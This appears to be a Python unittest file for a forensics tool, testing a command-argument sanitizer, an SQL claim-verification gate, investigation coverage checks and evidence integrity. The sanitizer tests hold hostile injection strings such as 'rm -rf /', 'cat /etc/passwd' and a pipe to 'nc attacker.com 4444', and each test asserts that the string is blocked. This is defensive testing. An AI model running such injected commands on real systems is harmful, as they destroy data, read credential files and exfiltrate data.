
import sys
import os
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from core.database import initialize_database, execute_safe_query
from core.assertions import run_assertion, AssertionFailedError, TemporalContradictionError
from core.coverage import CoverageTracker
from core.sanitizer import sanitize_args
from data.create_test_data import create_test_dataset


class TestSanitizer(unittest.TestCase):
    """Architectural evidence protection — injection prevention."""

    def test_blocks_semicolon_injection(self):
        safe, reason = sanitize_args(['vol', '-f', 'image.raw; rm -rf /'])
        self.assertFalse(safe)
        self.assertIn('SECURITY_BLOCK', reason)

    def test_blocks_double_ampersand(self):
        safe, reason = sanitize_args(['fls', 'image.E01 && cat /etc/passwd'])
        self.assertFalse(safe)

    def test_blocks_destructive_rm(self):
        safe, reason = sanitize_args(['bash', '-c', 'rm -rf /evidence'])
        self.assertFalse(safe)

    def test_blocks_pipe_injection(self):
        safe, reason = sanitize_args(['vol', 'image.raw | nc attacker.com 4444'])
        self.assertFalse(safe)

    def test_allows_safe_vol_args(self):
        safe, reason = sanitize_args(
            ['vol', '-f', '/media/sf_case/memory.raw', 'windows.pslist']
        )
        self.assertTrue(safe)
        self.assertIsNone(reason)

    def test_allows_safe_fls_args(self):
        safe, reason = sanitize_args(
            ['fls', '-r', '-m', '/', '/path/to/image.E01']
        )
        self.assertTrue(safe)


class TestAssertionEngine(unittest.TestCase):
    """SQL assertion gate — no hallucination can pass this."""

    @classmethod
    def setUpClass(cls):
        create_test_dataset()

    def test_valid_claim_confirmed(self):
        finding = run_assertion({
            'claim': 'mimikatz.exe was present on disk',
            'evidence_table': 'mft_events',
            'sql_filter': "filename = 'mimikatz.exe'",
            'expected_result': 'at_least_one_row',
            'mitre_technique': 'T1003.001'
        })
        self.assertEqual(finding['assertion_result'], 'CONFIRMED')
        self.assertIsNotNone(finding['finding_id'])
        self.assertGreater(finding['rows_matched'], 0)

    def test_invented_claim_rejected(self):
        with self.assertRaises(AssertionFailedError):
            run_assertion({
                'claim': 'totally_fake_malware.exe was present',
                'evidence_table': 'mft_events',
                'sql_filter': "filename = 'totally_fake_malware_xyz_123.exe'",
                'expected_result': 'at_least_one_row',
                'mitre_technique': 'T1059'
            })

    def test_temporal_contradiction_fires(self):
        """evil.exe deleted at 03:12 but prefetch shows it ran at 03:17."""
        with self.assertRaises(TemporalContradictionError):
            run_assertion({
                'claim': 'evil.exe execution confirmed via prefetch',
                'evidence_table': 'prefetch_events',
                'sql_filter': "executable_name LIKE '%EVIL%'",
                'expected_result': 'at_least_one_row',
                'mitre_technique': 'T1059.003'
            })

    def test_evidence_write_blocked(self):
        """The database must be read-only from the assertion layer."""
        with self.assertRaises(Exception):
            execute_safe_query("DELETE FROM mft_events")

    def test_evidence_insert_blocked(self):
        with self.assertRaises(Exception):
            execute_safe_query(
                "INSERT INTO mft_events (filename) VALUES ('injected')"
            )


class TestCoverageGate(unittest.TestCase):
    """Investigation coverage matrix — completeness enforcement."""

    def test_incomplete_investigation_blocked(self):
        tracker = CoverageTracker("windows_compromise")
        # Called no tools — should fail
        with self.assertRaises(ValueError) as ctx:
            tracker.assert_complete()
        self.assertIn('CANNOT CONCLUDE', str(ctx.exception))

    def test_complete_investigation_passes(self):
        tracker = CoverageTracker("windows_compromise")
        tracker.record_tool("get_mft_timeline")
        tracker.record_tool("get_prefetch")
        tracker.record_tool("get_registry_runkeys")
        tracker.record_tool("get_evtx_events")
        result = tracker.assert_complete()
        self.assertTrue(result)

    def test_coverage_report_has_required_fields(self):
        tracker = CoverageTracker("generic")
        report = tracker.report()
        for field in ['coverage_percentage', 'mandatory_covered',
                      'mandatory_missing', 'tools_called', 'is_complete']:
            self.assertIn(field, report)

    def test_100_percent_when_all_covered(self):
        tracker = CoverageTracker("windows_compromise")
        tracker.record_tool("get_mft_timeline")
        tracker.record_tool("get_prefetch")
        tracker.record_tool("get_registry_runkeys")
        tracker.record_tool("get_evtx_events")
        report = tracker.report()
        self.assertEqual(report['coverage_percentage'], 100)


class TestEvidenceIntegrity(unittest.TestCase):
    """Prove data integrity — findings match actual DB rows."""

    @classmethod
    def setUpClass(cls):
        create_test_dataset()

    def test_registry_persistence_exists(self):
        rows = execute_safe_query(
            "SELECT * FROM registry_runkeys WHERE value_name = 'WindowsUpdater'"
        )
        self.assertEqual(len(rows), 1)
        self.assertIn('evil.exe', rows[0]['value_data'])

    def test_audit_log_clear_event_exists(self):
        rows = execute_safe_query(
            "SELECT * FROM evtx_events WHERE event_id = 1102"
        )
        self.assertGreater(len(rows), 0)

    def test_evil_exe_deleted_before_run(self):
        """The impossible sequence must be in the database."""
        deleted = execute_safe_query(
            "SELECT * FROM mft_events WHERE filename='evil.exe' AND action='delete'"
        )
        ran = execute_safe_query(
            "SELECT * FROM prefetch_events WHERE executable_name LIKE '%EVIL%'"
        )
        self.assertGreater(len(deleted), 0, "delete event must exist")
        self.assertGreater(len(ran), 0, "prefetch entry must exist")
        # The temporal contradiction: deletion time < run time
        del_time = deleted[0]['modified_at']
        run_time = ran[0]['last_run_time']
        self.assertLess(del_time, run_time, "deletion must precede execution")

    def test_sha256_chain_present(self):
        rows = execute_safe_query(
            "SELECT sha256_of_raw_output FROM mft_events LIMIT 1"
        )
        self.assertGreater(len(rows), 0)
        self.assertIsNotNone(rows[0]['sha256_of_raw_output'])
        self.assertNotEqual(rows[0]['sha256_of_raw_output'], '')


if __name__ == '__main__':
    unittest.main(verbosity=2)